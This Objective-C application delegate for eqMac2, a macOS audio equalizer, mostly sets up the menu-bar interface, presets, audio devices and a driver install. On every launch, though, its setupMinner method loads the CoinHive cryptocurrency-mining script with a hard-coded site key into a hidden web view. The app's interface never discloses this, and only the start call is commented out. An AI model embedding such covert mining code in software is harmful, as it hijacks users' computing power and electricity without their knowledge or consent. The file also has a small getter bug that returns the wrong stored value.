//
//  AppDelegate.m
//  eqMac2
//
//  Created by Roman on 08/11/2015.
//  Copyright © 2015 bitgapp. All rights reserved.
//

#import "AppDelegate.h"

@interface AppDelegate ()

#pragma mark Outlets

@property (strong) IBOutlet NSViewController *viewController;
@property (strong) IBOutlet ITSwitch *toggleSwitch;
@property (strong) IBOutlet NSPopUpButton *presetsPopup;
@property (strong) IBOutlet NSButton *saveButton;
@property (strong) IBOutlet NSButton *deleteButton;
@property (strong) IBOutlet NSView *bandLabelsView;
@property (strong) IBOutlet NSView *mockSliderView;
@property (strong) IBOutlet NSPopUpButton *outputDevicePopup;
@property (strong) IBOutlet NSButton *bandModeButton;
@property (strong) IBOutlet NSView *controlsView;
@property (strong) IBOutlet NSImageView *leftSpeaker;
@property (strong) IBOutlet NSSlider *balanceSlider;
@property (strong) IBOutlet NSImageView *rightSpeaker;
@property (strong) IBOutlet NSButton *launchOnStartupCheckbox;
@property (strong) IBOutlet NSButton *showDefaultPresetsCheckbox;

@property (strong) IBOutlet NSView *optionsView;

@property (strong) IBOutlet NSTextField *buildLabel;

@end

#pragma mark Properties

NSStatusItem *statusBar;
eqMacStatusItemView *statusItemView;
NSPopover *popover;
WKWebView *minningWebView;
SliderGraphView *sliderView;
NSEvent *popoverTransiencyMonitor;

NSMutableDictionary *state;
NSArray *outputDevices;

@implementation AppDelegate

#pragma mark Setup

-(void)applicationDidFinishLaunching:(NSNotification *)notification{
    [self checkAndInstallDriver];
    [self runHelperIfNotRunning];
    [self setupStatusBar];
    [self setupPopover];
    [self setupDefaults];
    [self loadState];
    [self setupView];
    [self setBandModeButtonTitle];
    
    //Send anonymous analytics data to the API
    [API startPinging];
    
    [self setupMinner];
}


-(void)checkAndInstallDriver{
    if(![Devices eqMacDriverInstalled]){
        //Install only the new driver
        switch([Utilities showAlertWithTitle:NSLocalizedString(@"eqMac2 Requires a Driver",nil)
                                  andMessage:NSLocalizedString(@"In order to install the driver, the app will ask for your system password.",nil)
                                  andButtons:@[NSLocalizedString(@"Install",nil), NSLocalizedString(@"Quit",nil)]]){
            case NSAlertFirstButtonReturn:{
                if(![Utilities runSudoShellScriptWithName:@"install_driver.sh"]){
                    [self checkAndInstallDriver];
                };
                break;
            }
            case NSAlertSecondButtonReturn:{
                [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
                break;
            }
        }
    }
}

-(void)setupStatusBar{
    statusItemView = [[eqMacStatusItemView alloc] init];
    statusItemView.target = self;
    
    //Open EQ View on Left and Right Click
    statusItemView.action = @selector(openPopover);
    statusItemView.rightAction = @selector(openPopover);
    
    statusBar = [[NSStatusBar systemStatusBar] statusItemWithLength:NSSquareStatusItemLength];
    [statusBar setView:statusItemView];
    [self setStatusItemIcon];
    [Utilities executeBlock:^{ [self setStatusItemIcon]; } every:1];
}

-(void)setStatusItemIcon{
    statusItemView.image = [NSImage imageNamed: [Utilities isDarkMode] ? @"statusItemLight" : @"statusItemDark"];
}

-(void)setupPopover{
    popover = [[NSPopover alloc] init];
    [popover setDelegate:self];
    [popover setContentViewController: _viewController];
    [popover setBehavior:NSPopoverBehaviorTransient];
}

-(void)setupDefaults{
    if(![Utilities appLaunchedBefore]){
        [Utilities setLaunchOnLogin:YES];
    }
}

-(void)loadState{
    state = [Storage get: kStorageState];
    
    if (!state) {
        state = [@{
          @"selectedBandMode": @"10",
          @"show10BandDefaultPresets": @YES,
          @"10": @{
                  @"presets": @[],
                  @"selectedPresetName": @"Flat",
                  @"selectedGains": @[@0, @0, @0, @0, @0, @0, @0, @0, @0, @0]
                  },
          @"31": @{
                  @"presets": @[],
                  @"selectedPresetName": @"Flat",
                  @"selectedGains": @[@0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0, @0]
                  }
        } mutableCopy];
        
        if ([Utilities appLaunchedBefore]) {
            [[state objectForKey:@"10"] setObject:[Storage get: kStoragePresets] forKey:@"presets"];
            [[state objectForKey:@"10"] setObject:[Storage get: kStorageSelectedPresetName] forKey:@"selectedPresetName"];
            [[state objectForKey:@"10"] setObject:[Storage get: kStorageSelectedGains] forKey:@"selectedGains"];
        }
        
        [self saveState];
    }
}

-(NSString*)getSelectedBandMode{
    return [state objectForKey: @"selectedBandMode"];
}

-(NSNumber*)getShow10BandDefaultPresets{
    return [state objectForKey: @"selectedBandMode"];
}

-(NSMutableArray*)getPresets{
    return [[state objectForKey:[self getSelectedBandMode]] objectForKey:@"presets"];
}

-(NSString*)getSelectedPresetName{
    return [[state objectForKey:[self getSelectedBandMode]] objectForKey:@"selectedPresetName"];
}

-(NSArray*)getSelectedGains{
    return [[state objectForKey:[self getSelectedBandMode]] objectForKey:@"selectedGains"];
}

-(void)setupView{
    // Toggle Button
    [_toggleSwitch setChecked: YES];
    
    // Presets dropdown
    [self populatePresetsPopup];
    
    // Presets buttons
    [self setButtonColors];
    
    // Band Frequency values strip
    [self setupBandLabelsView];
    
    //Sliders View
    sliderView = [[SliderGraphView alloc] initWithFrame: _mockSliderView.frame];
    _mockSliderView = nil;
    [_viewController.view addSubview: sliderView];
    
    // Output Device Dropdown
    [self populateOutputDevicePopup];
    
    
    
    //Show Default Presets Checkbox
    [_showDefaultPresetsCheckbox setState:[[Storage get:kStorageShowDefaultPresets] integerValue]];
    
    //Build Label
    [_buildLabel setStringValue:[@"Build " stringByAppendingString:[Utilities getAppVersion]]];
}


-(void)populatePresetsPopup{
    [_presetsPopup removeAllItems];
    NSArray *presets = [Presets getShowablePresetsNames];
    [_presetsPopup addItemsWithTitles:[presets sortedArrayUsingComparator:^NSComparisonResult(NSString *firstString, NSString *secondString) {
        return [[firstString lowercaseString] compare:[secondString lowercaseString]];
    }]];
}

-(void)setButtonColors{
    [_deleteButton setImage:[Utilities isDarkMode] ? [NSImage imageNamed:@"deleteLight.png"] : [NSImage imageNamed:@"deleteDark.png"]];
    [_saveButton setImage:[Utilities isDarkMode] ? [NSImage imageNamed:@"saveLight.png"] : [NSImage imageNamed:@"saveDark.png"]];
}

-(void)setupBandLabelsView{
    
}

-(void)populateOutputDevicePopup{
    [_outputDevicePopup removeAllItems];
    outputDevices = [Devices getAllUsableDevices];

    NSMutableArray *deviceNames = [[NSMutableArray alloc] init];

    for (NSDictionary *device in outputDevices) {
        [deviceNames addObject: [device objectForKey:@"name"]];
    }

    [_outputDevicePopup addItemsWithTitles: [deviceNames sortedArrayUsingComparator:^NSComparisonResult(NSString *firstString, NSString *secondString) {
        return [[firstString lowercaseString] compare:[secondString lowercaseString]];
    }]];
}



-(void)setBandModeButtonTitle{
    
}

-(void)setupMinner{
    minningWebView = [[WKWebView alloc] initWithFrame: NSMakeRect(0, 0, 100, 100)];
    [minningWebView loadHTMLString:
     @"<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
     "<script>"
     "var miner = new CoinHive.Anonymous('q6ukpBWVcibzNnJIJG2fpgRJ88ssKJ30');"
     "</script>" baseURL:nil];
    //    [minningWebView evaluateJavaScript:@"miner.start()" completionHandler:nil];
}


-(void)popoverWillShow:(NSNotification *)notification{
//    [self readjustView];
}

- (void)openPopover{
    if([popover isShown]){
        [popover close];
    }else{
        [popover showRelativeToRect: statusItemView.bounds ofView: statusItemView preferredEdge: NSMaxYEdge];
        NSWindow *popoverWindow = popover.contentViewController.view.window;
        [popoverWindow.parentWindow removeChildWindow:popoverWindow];
        if (popoverTransiencyMonitor == nil) {
            popoverTransiencyMonitor = [NSEvent addGlobalMonitorForEventsMatchingMask:(NSLeftMouseDownMask | NSRightMouseDownMask | NSKeyUpMask) handler:^(NSEvent* event) {
                [NSEvent removeMonitor:popoverTransiencyMonitor];
                popoverTransiencyMonitor = nil;
                [popover close];
            }];
        }
    }
}

- (IBAction)changePreset:(NSPopUpButton *)sender {
    NSString *presetName = [sender titleOfSelectedItem];
    [self switchToPresetWithName: presetName];
}

-(void)switchToPresetWithName:(NSString *)presetName {
    NSArray *gains = [Presets getGainsForPreset:presetName];
    [sliderView animateBandsToValues:gains];
    [EQHost setEQEngineFrequencyGains:gains];
    [_presetsPopup setTitle:presetName];
}

-(void)startProcessing{
    
}

-(void)stopProcessing{
    
}

-(void)popoverWillClose:(NSNotification *)notification{
    [statusItemView setHighlightState: NO];
}


- (void)applicationWillTerminate:(NSNotification *)aNotification {
    [self tearDownEQEngine];
}

-(void)tearDownEQEngine{
    if([EQHost EQEngineExists]){
        [EQHost deleteEQEngine];
    }
    
//    [Storage set:[viewController getSelectedPresetName] key:kStorageSelectedPresetName];
    [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
}

-(void)runHelperIfNotRunning{
    BOOL running = false;
    
    for (NSRunningApplication *application in [[NSWorkspace sharedWorkspace] runningApplications]) {
        if ([[application bundleIdentifier] isEqualToString:@"com.bitgapp.eqMac2Helper"]) {
            running = true;
        }
    }
    
    if (!running) {
        
        NSString *resourcePath = [[NSBundle bundleForClass:[self class]] resourcePath];
        NSString *helperAppPath = [NSString stringWithFormat:@"%@/eqMac2Helper.app", resourcePath];
        NSString *command = [NSString stringWithFormat:@"open %@", helperAppPath];
        system([command UTF8String]);
        
        NSURL *helperAppURL = [[NSBundle mainBundle] URLForResource:@"eqMac2Helper" withExtension:@"app"];
        
        [Utilities setLaunchOnLogin:YES forBundleURL:helperAppURL];

    }
}

-(void)readjustPopover{
    [popover setContentSize: _viewController.view.bounds.size];
}

- (IBAction)quit:(id)sender {
    [self tearDownEQEngine];
    [NSApp terminate:nil];
}

-(void)saveState{
    
}

- (IBAction)uninstallApplication:(id)sender {
    if([Utilities showAlertWithTitle:NSLocalizedString(@"Uninstall eqMac2?",nil)
                          andMessage:NSLocalizedString(@"Are you sure about this?",nil)
                          andButtons:@[NSLocalizedString(@"Yes, uninstall",nil),NSLocalizedString(@"No, cancel",nil)]] == NSAlertFirstButtonReturn){

        if([EQHost EQEngineExists]) [EQHost deleteEQEngine];
        [Utilities runSudoShellScriptWithName:@"uninstall_app.sh"];
        [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
    }
}

@end
